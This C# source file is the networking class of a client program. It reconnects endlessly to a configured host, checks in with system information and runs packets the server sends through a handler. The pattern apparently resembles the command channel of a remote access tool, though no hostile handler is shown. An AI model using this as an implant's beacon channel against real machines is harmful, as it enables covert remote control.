using Client.Utils;
using PacketLib;
using Client.Handlers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client.Network
{
    internal class _Client
    {
        public static int OneMb = 1000000;
        public static TcpClient tcpClient { get; set; }
        private static NetworkStream networkStream { get; set; }
        private static CancellationTokenSource cancellationToken { get; set; }
        private static object SendOneByOne { get; set; }
        public static void Connect()
        {
            try
            {
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(Settings.Host), Settings.Port);
                while (true)
                {
                    if (!isConnected())
                    {
                        try
                        {
                            SendOneByOne = new object();
                            tcpClient = new TcpClient();
                            tcpClient.Connect(endPoint);
                            tcpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                            networkStream = tcpClient.GetStream();
                        }
                        catch { }
                    }
                    else
                    {
                        if (cancellationToken == null)
                        {
                            cancellationToken = new CancellationTokenSource();
                            Task.Run(() => { Recieve(); }, cancellationToken.Token);
                            _Client.Send(new BasicInfo().Get());
                            MsgPack msgPack = new MsgPack();
                            msgPack.Set("Packet", "Ping");
                            msgPack.Set("Message", "From client !");
                            _Client.Send(msgPack.Pack());
                        }
                    }
                    Thread.Sleep(500);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                Disconnect();
            }
        }
        private static async void Recieve()
        {
            try
            {
                while (true)
                {
                    if (tcpClient == null) throw new Exception("no connection");
                    byte[] bytes = new byte[4];
                    int byteSize = await networkStream.ReadAsync(bytes, 0, bytes.Length);
                    byteSize = BitConverter.ToInt32(bytes, 0);
                    if (byteSize > 0)
                    {
                        bytes = new byte[byteSize];
                        int totalRecieved = 0;
                        while (totalRecieved < byteSize)
                        {
                            totalRecieved += await networkStream.ReadAsync(bytes, totalRecieved, bytes.Length - totalRecieved);
                        }
                        ThreadPool.QueueUserWorkItem(state =>
                        {
                            new HandlePacket
                            {
                                packet = bytes
                            }.Run(state);
                        }, null);
                    }
                    else
                    {
                        Disconnect();
                    }
                }
            }
            catch (Exception ex)
            {
                Disconnect();
            }

        }
        public static void Send(byte[] bytes)
        {
            lock (SendOneByOne)
            {
                try
                {

                    byte[] byteSize = BitConverter.GetBytes(bytes.Length);
                    networkStream.Write(byteSize, 0, byteSize.Length);

                    if (bytes.Length > OneMb)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(bytes))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[OneMb];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                networkStream.Write(chunk, 0, read);
                            }
                        }
                    }
                    else
                    {
                        networkStream.Write(bytes, 0, bytes.Length);
                    }

                }
                catch (Exception ex)
                {
                    Disconnect();
                }
            }
        }
        public static bool isConnected()
        {
            if (tcpClient == null) return false;
            return tcpClient.Connected;
        }
        public static void Disconnect()
        {
            try
            {
                Debug.WriteLine("Disconnected !");
                cancellationToken?.Cancel();
                tcpClient?.Close();
                networkStream = null;
                tcpClient = null;
                cancellationToken = null;
                GC.Collect();
            }
            catch { }
        }
    }
}
